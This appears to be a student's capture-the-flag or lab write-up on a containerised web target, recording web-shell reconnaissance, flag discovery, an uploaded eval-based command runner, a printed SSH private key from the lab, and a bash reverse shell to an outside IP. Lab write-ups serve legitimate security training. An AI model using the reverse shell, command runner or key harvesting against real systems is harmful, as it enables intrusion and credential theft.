# Gate 1 - Where Am I Starting?

## Flags:
1. PIVOT-SPARK - Process listing
2. CANOPY-SIGNAL - catting /.dockerenv 
3. ARCHIVE-ECHO - running env
4. 


## What user, host, shell, working directory, OS, process list, and network state can you observe from the web shell?
	- on visiting the web console

whoami
```
www-data
```

uname -a
```
Linux 223933f455d2 5.4.0-135-generic #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 x86_64 GNU/Linux
```

env
```
APACHE_CONFDIR=/etc/apache2
HOSTNAME=223933f455d2
PHP_INI_DIR=/usr/local/etc/php
SHLVL=0
REMOTE_EXEC_ROOT=/var/run/exec-dropbox
DOCKERENV_ENV_FLAG=CANOPY-SIGNAL
PHP_LDFLAGS=-Wl,-O1 -pie
APACHE_RUN_DIR=/var/run/apache2
PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
PHP_VERSION=8.2.30
APACHE_PID_FILE=/var/run/apache2/apache2.pid
GPG_KEYS=39B641343D8C104B2B146DC3F9C39DC0B9698544 E60913E4DF209907D8E30D96659A97C9CF2A795A 1198C0117593497A5EC5C199286AF1F9897469DC
PHP_ASC_URL=https://www.php.net/distributions/php-8.2.30.tar.xz.asc
PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
PHP_URL=https://www.php.net/distributions/php-8.2.30.tar.xz
LAB31_WEB_TOKEN=ops_console_token
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
RECENT_FILE_FLAG=ARCHIVE-ECHO
APACHE_RUN_GROUP=www-data
APACHE_RUN_USER=www-data
APACHE_LOG_DIR=/var/log/apache2
CONTAINER_PROCESS_FLAG=PIVOT-SPARK
PWD=/var/www/html
PHPIZE_DEPS=autoconf 		dpkg-dev 		file 		g++ 		gcc 		libc-dev 		make 		pkg-config 		re2c
PHP_SHA256=bc90523e17af4db46157e75d0c9ef0b9d0030b0514e62c26ba7b513b8c4eb015
APACHE_ENVVARS=/etc/apache2/envvars
```
 
 ls -la /
```
total 72
drwxr-xr-x   1 root root 4096 Jun  3 03:42 .
drwxr-xr-x   1 root root 4096 Jun  3 03:42 ..
-rwxr-xr-x   1 root root   33 Jun  3 03:42 .dockerenv
lrwxrwxrwx   1 root root    7 Mar  2 21:50 bin -> usr/bin
drwxr-xr-x   2 root root 4096 Mar  2 21:50 boot
drwxr-xr-x   5 root root  340 Jun  3 03:42 dev
drwxr-xr-x   1 root root 4096 Jun  3 03:42 etc
drwxr-xr-x   2 root root 4096 Mar  2 21:50 home
lrwxrwxrwx   1 root root    7 Mar  2 21:50 lib -> usr/lib
lrwxrwxrwx   1 root root    9 Mar  2 21:50 lib64 -> usr/lib64
drwxr-xr-x   2 root root 4096 Apr  6 00:00 media
drwxr-xr-x   2 root root 4096 Apr  6 00:00 mnt
drwxr-xr-x   2 root root 4096 Apr  6 00:00 opt
dr-xr-xr-x 284 root root    0 Jun  3 03:42 proc
drwx------   2 root root 4096 Apr  6 00:00 root
drwxr-xr-x   1 root root 4096 Apr  7 14:45 run
lrwxrwxrwx   1 root root    8 Mar  2 21:50 sbin -> usr/sbin
drwxr-xr-x   2 root root 4096 Apr  6 00:00 srv
dr-xr-xr-x  13 root root    0 Jun  3 12:16 sys
drwxrwxrwt   1 root root 4096 Jun  3 03:42 tmp
drwxr-xr-x   1 root root 4096 Apr  6 00:00 usr
drwxr-xr-x   1 root root 4096 Apr  7 01:37 var
```
cat /.dockerenv
```
DOCKERENV_ENV_FLAG=CANOPY-SIGNAL
```
ps -lef
```
F S UID          PID    PPID  C PRI  NI ADDR SZ WCHAN  STIME TTY          TIME CMD
4 S root           1       0  0  80   0 - 46445 -      03:42 ?        00:00:01 apache2 -DFOREGROUND
4 S root          10       1  0  80   0 -   666 -      03:42 ?        00:00:00 /bin/sh /usr/local/bin/PIVOT-SPARK
5 S www-data      25       1  0  80   0 - 46490 -      03:42 ?        00:00:00 apache2 -DFOREGROUND
5 S www-data      26       1  0  80   0 - 46490 -      03:42 ?        00:00:00 apache2 -DFOREGROUND
5 S www-data      27       1  0  80   0 - 46490 -      03:42 ?        00:00:00 apache2 -DFOREGROUND
5 S www-data      28       1  0  80   0 - 46490 -      03:42 ?        00:00:00 apache2 -DFOREGROUND
5 S www-data      29       1  0  80   0 - 46490 -      03:42 ?        00:00:00 apache2 -DFOREGROUND
5 S www-data     130       1  0  80   0 - 46490 -      12:06 ?        00:00:00 apache2 -DFOREGROUND
5 S www-data     131       1  0  80   0 - 46490 -      12:07 ?        00:00:00 apache2 -DFOREGROUND
5 S www-data     132       1  0  80   0 - 46490 -      12:07 ?        00:00:00 apache2 -DFOREGROUND
0 S root         153      10  0  80   0 -   643 -      12:17 ?        00:00:00 sleep 300
4 S www-data     156      26  0  80   0 -   666 do_wai 12:19 ?        00:00:00 sh -c -- ps -lef 2>&1
4 R www-data     157     156  0  80   0 -  1607 -      12:19 ?        00:00:00 ps -lef
```
		- file /usr/local/bin/PIVOT-SPARK
			- /usr/local/bin/PIVOT-SPARK: POSIX shell script, ASCII text executable
		- cat /usr/local/bin/PIVOT-SPARK
```
#!/bin/sh
while true; do
  sleep 300
done
```

## What evidence shows this is a containerized or otherwise abstracted runtime?
- the existance of the /.dockerenv file and the minimal processes/services
## Which process, file-activity, or environment artifacts look intentionally placed for this exercise?
	- See Flags
## Which three objectives can you recover from this first runtime context?

# Gate 2: What Does Upload and Execute Actually Do?

## Flags
1. GRANITE-BRIDGE - /srv/archive/reports/maintenance-readme.txt
2. ATLAS-SHARD - /usr/share/man/man7/ops-runtime.7.gz
3. MARLIN-FOCUS - /opt/ops/objectives.txt

- What paths or labels does the web page reveal for uploaded files and remote execution?
	- mounted_path_hint=/srv/archive/reports/maintenance-readme.txt
	- limited_tooling_hint=extract-token-from-man-source
	- man_source=/usr/share/man/man7/ops-runtime.7.gz
	- man_validator=/opt/ops/tools/check-man-evidence
	- ssh_artifacts=/opt/ops/ssh-materials
- If you upload a small diagnostic payload, what does its output prove about where it ran?
	- /app
- What output fields or response text are different from local web-shell command output?
- Which discovered hints point toward mounted data, missing-tool adaptation, scoped request/response behavior, or later movement?

shell script:
`cmd <command to run>`
```
#!/bin/bash

# Check if at least one argument was passed
if [ $# -eq 0 ]; then
    echo "Error: No command provided.'Usage: $0 <command>"
	exit 1
fi
        
# Combine all script arguments into a single command string
COMMAND="$*"
        
# Run the command and capture output & error
OUTPUT=$(eval "$COMMAND" 2>&1)
STATUS=$?
        
# Print results
if [ $STATUS -eq 0 ]; then
	echo "$OUTPUT"
else
	echo "Error: Command failed with exit code $STATUS."
	echo "Details:"
        echo "$OUTPUT"
fi

```
cat /srv/archive/reports/maintenance-readme.txt
```
source=exec-container
exit_code=0
mounted_path_hint=/srv/archive/reports/maintenance-readme.txt
limited_tooling_hint=extract-token-from-man-source
man_source=/usr/share/man/man7/ops-runtime.7.gz
man_validator=/opt/ops/tools/check-man-evidence
ssh_artifacts=/opt/ops/ssh-materials
stdout=Maintenance archive notes:
- This path is host-mounted into the container for maintenance workflows.
- Verify mounted path context before trusting data boundaries.
- mounted_path_flag=GRANITE-BRIDGE
- ssh_artifact_hint=/opt/ops/ssh-materials
stderr=
```

```
root@0521ead29eb7:/var/run/exec-dropbox/uploads# cd /opt/ops
cd /opt/ops

root@0521ead29eb7:/opt/ops# ls -la
ls -la
total 28
drwxr-xr-x 1 root root 4096 Jun  3 03:42 .
drwxr-xr-x 1 root root 4096 Apr  7 14:45 ..
-rw-r--r-- 1 root root  174 Jun  3 03:42 objectives.txt
drwxr-xr-x 1 root root 4096 Apr  7 14:45 ssh-materials
-rw-r--r-- 1 root root  211 Jun  3 03:42 tooling-note.txt
drwxr-xr-x 2 root root 4096 Jun  3 03:42 tools

root@0521ead29eb7:/opt/ops# cat tooling-note.txt
cat tooling-note.txt
limited tooling observed: ssh,nc,netstat,ss,ip,man
objective_hint=man command missing; inspect manpage source directly
man_source=/usr/share/man/man7/ops-runtime.7.gz
validator=/opt/ops/tools/check-man-evidence

root@0521ead29eb7:/opt/ops# cat obj*
cat obj*
Container role: exec
mounted_path_flag=GRANITE-BRIDGE
limited_tooling_objective=missing-man-alt-method
misconfig_scope_flag=MARLIN-FOCUS
ssh_artifacts=/opt/ops/ssh-materials
```
ls -la /opt/ops/ssh-materials
```
source=exec-container
exit_code=0
mounted_path_hint=/srv/archive/reports/maintenance-readme.txt
limited_tooling_hint=extract-token-from-man-source
man_source=/usr/share/man/man7/ops-runtime.7.gz
man_validator=/opt/ops/tools/check-man-evidence
ssh_artifacts=/opt/ops/ssh-materials
stdout=total 16
drwxr-xr-x 1 root root 4096 Apr  7 14:45 .
drwxr-xr-x 1 root root 4096 Jun  3 03:42 ..
-rw-r--r-- 1 root root  189 Apr  6 18:24 config
-rw------- 1 root root  399 Apr  6 18:16 id_peer_ops
stderr=
```

cat /opt/ops/ssh-materials/config
```
source=exec-container
exit_code=0
mounted_path_hint=/srv/archive/reports/maintenance-readme.txt
limited_tooling_hint=extract-token-from-man-source
man_source=/usr/share/man/man7/ops-runtime.7.gz
man_validator=/opt/ops/tools/check-man-evidence
ssh_artifacts=/opt/ops/ssh-materials
stdout=Host busybox-peer
    HostName internal-shell
    Port 22
    User opspeer
    IdentityFile /opt/ops/ssh-materials/id_peer_ops
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null
stderr=
```


```
source=exec-container
exit_code=0
mounted_path_hint=/srv/archive/reports/maintenance-readme.txt
limited_tooling_hint=extract-token-from-man-source
man_source=/usr/share/man/man7/ops-runtime.7.gz
man_validator=/opt/ops/tools/check-man-evidence
ssh_artifacts=/opt/ops/ssh-materials
stdout=-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBA/w7iY9CXtvTBAXekjCtfnWCiTxjM92KoA/zTd3cXUwAAAJAMv3zgDL98
4AAAAAtzc2gtZWQyNTUxOQAAACBA/w7iY9CXtvTBAXekjCtfnWCiTxjM92KoA/zTd3cXUw
AAAECArA4NqqfJw2Mp3x1jBiQqrhVpNEsI952g2Ci9fNTW3UD/DuJj0Je29MEBd6SMK1+d
YKJPGMz3YqgD/NN3dxdTAAAACWthbGlAa2FsaQECAwQ=
-----END OPENSSH PRIVATE KEY-----
stderr=
```

cat 
```
source=exec-container
exit_code=0
mounted_path_hint=/srv/archive/reports/maintenance-readme.txt
limited_tooling_hint=extract-token-from-man-source
man_source=/usr/share/man/man7/ops-runtime.7.gz
man_validator=/opt/ops/tools/check-man-evidence
ssh_artifacts=/opt/ops/ssh-materials
stdout=#!/bin/sh
set -eu
if [ -z "${1:-}" ]; then
  echo "usage: check-man-evidence <token>"
  exit 2
fi
if [ "$1" = "runtime-manproof" ]; then
  echo "limited_tooling_flag=ATLAS-SHARD"
  exit 0
fi
echo "result=invalid-token"
exit 1
stderr=
```

```
source=exec-container
exit_code=0
mounted_path_hint=/srv/archive/reports/maintenance-readme.txt
limited_tooling_hint=extract-token-from-man-source
man_source=/usr/share/man/man7/ops-runtime.7.gz
man_validator=/opt/ops/tools/check-man-evidence
ssh_artifacts=/opt/ops/ssh-materials
stdout=
stderr=
```

```
source=exec-container
exit_code=0
mounted_path_hint=/srv/archive/reports/maintenance-readme.txt
limited_tooling_hint=extract-token-from-man-source
man_source=/usr/share/man/man7/ops-runtime.7.gz
man_validator=/opt/ops/tools/check-man-evidence
ssh_artifacts=/opt/ops/ssh-materials
stdout=Running Command: ls -la /
----------------------------------------
total 68
drwxr-xr-x   1 root root 4096 Jun  3 03:42 .
drwxr-xr-x   1 root root 4096 Jun  3 03:42 ..
-rwxr-xr-x   1 root root    0 Jun  3 03:42 .dockerenv
drwxr-xr-x   1 root root 4096 Apr  7 14:45 app
lrwxrwxrwx   1 root root    7 Mar  2 21:50 bin -> usr/bin
drwxr-xr-x   2 root root 4096 Mar  2 21:50 boot
drwxr-xr-x   5 root root  340 Jun  3 03:42 dev
drwxr-xr-x   1 root root 4096 Jun  3 03:42 etc
drwxr-xr-x   2 root root 4096 Mar  2 21:50 home
lrwxrwxrwx   1 root root    7 Mar  2 21:50 lib -> usr/lib
lrwxrwxrwx   1 root root    9 Mar  2 21:50 lib64 -> usr/lib64
drwxr-xr-x   2 root root 4096 Apr  6 00:00 media
drwxr-xr-x   2 root root 4096 Apr  6 00:00 mnt
drwxr-xr-x   1 root root 4096 Apr  7 14:45 opt
dr-xr-xr-x 288 root root    0 Jun  3 03:42 proc
drwx------   1 root root 4096 Apr  7 02:17 root
drwxr-xr-x   1 root root 4096 Apr  7 14:45 run
lrwxrwxrwx   1 root root    8 Mar  2 21:50 sbin -> usr/sbin
drwxr-xr-x   1 root root 4096 Jun  3 03:42 srv
dr-xr-xr-x  13 root root    0 Jun  3 12:16 sys
drwxrwxrwt   2 root root 4096 Apr  6 00:00 tmp
drwxr-xr-x   1 root root 4096 Apr  6 00:00 usr
drwxr-xr-x   1 root root 4096 Apr  6 00:00 var
stderr=
```

reverse shell to remote exec containier
- bash -i >& /dev/tcp/80.90.100.10/8888 0>&1
```
root@0521ead29eb7:/app# ls -la
ls -la
total 16
drwxr-xr-x 1 root root 4096 Apr  7 14:45 .
drwxr-xr-x 1 root root 4096 Jun  3 03:42 ..
-rw-rw-r-- 1 root root 7478 Apr  6 19:59 exec_agent.py
root@0521ead29eb7:/app# cat exec_agent.py
cat exec_agent.py
import json
import os
import shutil
import subprocess
import time
import gzip
from pathlib import Path


DROPBOX_ROOT = Path(os.getenv("EXEC_DROPBOX_ROOT", "/var/run/exec-dropbox"))
UPLOADS_DIR = DROPBOX_ROOT / "uploads"
REQUESTS_DIR = DROPBOX_ROOT / "requests"
RESPONSES_DIR = DROPBOX_ROOT / "responses"

BRIDGE_ROOT = Path(os.getenv("BRIDGE_ROOT", "/var/run/node-agent"))
BRIDGE_REQ_DIR = BRIDGE_ROOT / "requests"
BRIDGE_RESP_DIR = BRIDGE_ROOT / "responses"

MOUNTED_PATH_FLAG = os.getenv("MOUNTED_PATH_FLAG", "CS{OPS-CONTAINER-MOUNT-3.1}")
LIMITED_TOOLING_FLAG = os.getenv("LIMITED_TOOLING_FLAG", "CS{OPS-CONTAINER-TOOLS-3.1}")
MISCONFIG_SCOPE_FLAG = os.getenv("MISCONFIG_SCOPE_FLAG", "CS{OPS-CONTAINER-MISCONFIG-3.1}")
SSH_ARTIFACT_ROOT = os.getenv("SSH_ARTIFACT_ROOT", "/opt/ops/ssh-materials")
MAN_OBJECTIVE_DIR = Path(os.getenv("MAN_OBJECTIVE_DIR", "/usr/share/man/man7"))
MAN_OBJECTIVE_PAGE = os.getenv("MAN_OBJECTIVE_PAGE", "ops-runtime.7.gz")
MAN_OBJECTIVE_TOKEN = os.getenv("MAN_OBJECTIVE_TOKEN", "runtime-manproof")
MAN_HELPER_PATH = Path(os.getenv("MAN_HELPER_PATH", "/opt/ops/tools/check-man-evidence"))


def ensure_layout() -> None:
    for path in (
        UPLOADS_DIR,
        REQUESTS_DIR,
        RESPONSES_DIR,
        BRIDGE_REQ_DIR,
        BRIDGE_RESP_DIR,
        Path(SSH_ARTIFACT_ROOT),
        MAN_OBJECTIVE_DIR,
        MAN_HELPER_PATH.parent,
    ):
        path.mkdir(parents=True, exist_ok=True)

    readme = BRIDGE_ROOT / "README.txt"
    readme.write_text(
        "Drop requests into ./requests as <name>.job.\n"
        "Agent writes output to ./responses/<name>.out.\n"
        "\n"
        "Supported request strings:\n"
        "- status\n"
        "- list-scopes\n",
        encoding="utf-8",
    )

    objective = Path("/opt/ops/objectives.txt")
    objective.write_text(
        "Container role: exec\n"
        "mounted_path_flag={}\n"
        "limited_tooling_objective=missing-man-alt-method\n"
        "misconfig_scope_flag={}\n"
        "ssh_artifacts={}\n".format(
            MOUNTED_PATH_FLAG,
            MISCONFIG_SCOPE_FLAG,
            SSH_ARTIFACT_ROOT,
        ),
        encoding="utf-8",
    )

    man_page_content = (
        ".TH OPS-RUNTIME 7\n"
        ".SH NAME\n"
        "ops-runtime \\- runtime operations reference\n"
        ".SH DESCRIPTION\n"
        "This environment intentionally omits the man command.\n"
        "Collect evidence from manpage source artifacts with alternate tooling.\n"
        ".SH VALIDATION\n"
        "token={}\n".format(MAN_OBJECTIVE_TOKEN)
    )
    with gzip.open(MAN_OBJECTIVE_DIR / MAN_OBJECTIVE_PAGE, "wt", encoding="utf-8") as handle:
        handle.write(man_page_content)

    MAN_HELPER_PATH.write_text(
        "#!/bin/sh\n"
        "set -eu\n"
        "if [ -z \"${{1:-}}\" ]; then\n"
        "  echo \"usage: check-man-evidence <token>\"\n"
        "  exit 2\n"
        "fi\n"
        "if [ \"$1\" = \"{}\" ]; then\n"
        "  echo \"limited_tooling_flag={}\"\n"
        "  exit 0\n"
        "fi\n"
        "echo \"result=invalid-token\"\n"
        "exit 1\n".format(MAN_OBJECTIVE_TOKEN, LIMITED_TOOLING_FLAG),
        encoding="utf-8",
    )
    MAN_HELPER_PATH.chmod(0o755)


def run_remote_job(job_path: Path) -> None:
    response_path = RESPONSES_DIR / f"{job_path.stem}.out"
    try:
        data = json.loads(job_path.read_text(encoding="utf-8"))
    except json.JSONDecodeError:
        response_path.write_text("error=invalid-job-json\n", encoding="utf-8")
        job_path.unlink(missing_ok=True)
        return

    target_name = Path(str(data.get("file", ""))).name
    args = str(data.get("args", "")).strip()
    if not target_name:
        response_path.write_text("error=missing-file\n", encoding="utf-8")
        job_path.unlink(missing_ok=True)
        return

    target = UPLOADS_DIR / target_name
    if not target.exists():
        response_path.write_text(f"error=file-not-found:{target_name}\n", encoding="utf-8")
        job_path.unlink(missing_ok=True)
        return

    target.chmod(0o755)
    cmd = [str(target)]
    if args:
        cmd.extend(args.split())

    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=12,
            check=False,
        )
        stdout = result.stdout.strip()
        stderr = result.stderr.strip()
        body = (
            f"source=exec-container\n"
            f"exit_code={result.returncode}\n"
            f"mounted_path_hint=/srv/archive/reports/maintenance-readme.txt\n"
            f"limited_tooling_hint=extract-token-from-man-source\n"
            f"man_source={MAN_OBJECTIVE_DIR / MAN_OBJECTIVE_PAGE}\n"
            f"man_validator={MAN_HELPER_PATH}\n"
            f"ssh_artifacts={SSH_ARTIFACT_ROOT}\n"
            f"stdout={stdout}\n"
            f"stderr={stderr}\n"
        )
        response_path.write_text(body, encoding="utf-8")
    except Exception as exc:  # pragma: no cover
        response_path.write_text(f"error=exec-failed:{exc}\n", encoding="utf-8")
    finally:
        job_path.unlink(missing_ok=True)


def process_bridge_job(job_path: Path) -> None:
    request = job_path.read_text(encoding="utf-8", errors="ignore").strip()
    response_path = BRIDGE_RESP_DIR / f"{job_path.stem}.out"
    if request == "status":
        response = (
            "agent=maintenance-scope-proxy\n"
            "scope=container-exec-support\n"
            f"misconfig_scope_flag={MISCONFIG_SCOPE_FLAG}\n"
        )
    elif request == "list-scopes":
        response = "allowed=status,list-scopes\n"
    else:
        response = "error=unsupported-request\n"
    response_path.write_text(response, encoding="utf-8")
    job_path.unlink(missing_ok=True)


def hide_ssh_client() -> None:
    # Keep SSH artifacts present but ensure there is no native ssh client.
    for candidate in ("/usr/bin/ssh", "/bin/ssh", "/usr/local/bin/ssh"):
        path = Path(candidate)
        if path.exists():
            try:
                path.unlink()
            except OSError:
                pass


def disable_man_command() -> None:
    man_path = shutil.which("man")
    if not man_path:
        return
    man_binary = Path(man_path)
    disabled_target = man_binary.with_name(f"{man_binary.name}.disabled")
    if disabled_target.exists():
        return
    try:
        man_binary.rename(disabled_target)
    except OSError:
        # Non-fatal in constrained images; objective still works if man is already absent.
        return


def write_runtime_hints() -> None:
    tooling_note = Path("/opt/ops/tooling-note.txt")
    missing = [name for name in ("ssh", "nc", "netstat", "ss", "ip") if shutil.which(name) is None]
    if shutil.which("man") is None:
        missing.append("man")
    tooling_note.write_text(
        "limited tooling observed: {}\n"
        "objective_hint=man command missing; inspect manpage source directly\n"
        "man_source={}\n"
        "validator={}\n".format(",".join(missing), MAN_OBJECTIVE_DIR / MAN_OBJECTIVE_PAGE, MAN_HELPER_PATH),
        encoding="utf-8",
    )


def main() -> None:
    ensure_layout()
    hide_ssh_client()
    disable_man_command()
    write_runtime_hints()
    while True:
        for remote_job in sorted(REQUESTS_DIR.glob("*.job")):
            run_remote_job(remote_job)
        for bridge_job in sorted(BRIDGE_REQ_DIR.glob("*.job")):
            process_bridge_job(bridge_job)
        time.sleep(1)


if __name__ == "__main__":
    main()

```

```
root@0521ead29eb7:/app# cat /usr/share/man/man7/ops-runtime.7
cat /usr/share/man/man7/ops-runtime.7
.TH OPS-RUNTIME 7
.SH NAME
ops-runtime \- runtime operations reference
.SH DESCRIPTION
This environment intentionally omits the man command.
Collect evidence from manpage source artifacts with alternate tooling.
.SH VALIDATION
token=runtime-manproof
```

/opt/ops/tools/check-man-evidence
```
root@0521ead29eb7:/app# cat /opt/ops/tools/check-man-evidence
cat /opt/ops/tools/check-man-evidence
#!/bin/sh
set -eu
if [ -z "${1:-}" ]; then
  echo "usage: check-man-evidence <token>"
  exit 2
fi
if [ "$1" = "runtime-manproof" ]; then
  echo "limited_tooling_flag=ATLAS-SHARD"
  exit 0
fi
echo "result=invalid-token"
exit 1
root@0521ead29eb7:/app# /opt/ops/tools/check-man-evidence runtime-manproof
/opt/ops/tools/check-man-evidence runtime-manproof
limited_tooling_flag=ATLAS-SHARD
root@0521ead29eb7:/app# 
```



---

walkthrough
	view source
	identify functions
	create own way to view and interact with the page
		$TGT = (url to the webpage)
		curl -v $TGT using the functions
	